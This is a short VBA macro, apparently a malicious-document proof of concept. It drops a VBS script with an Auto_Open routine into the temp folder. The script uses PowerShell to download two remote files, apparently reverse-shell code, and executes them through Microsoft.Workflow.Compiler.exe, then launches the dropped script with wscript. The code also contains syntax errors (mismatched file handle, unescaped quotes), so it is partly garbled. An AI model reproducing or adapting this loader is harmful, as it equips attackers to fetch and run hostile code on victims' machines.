Sub WritePayload()
 Dim File2 As Integer
 Dim FilePath As String
 FilePath = "%temp%\payload.vbs"
 File2 = FreeFile
 Open FilePath For Output As TextFile
 Print #File2, " Sub Auto_Open()"
 Print #File2, " Call Shell("cmd.exe /c powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/matt-culbert/Macro-Testing/master/rev1.txt', '.\Rev1.txt') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev1.txt"
 Print #File2, " End Sub"
 Close File2
 Shell "wscript %temp%\payload.vbs"
End Sub 
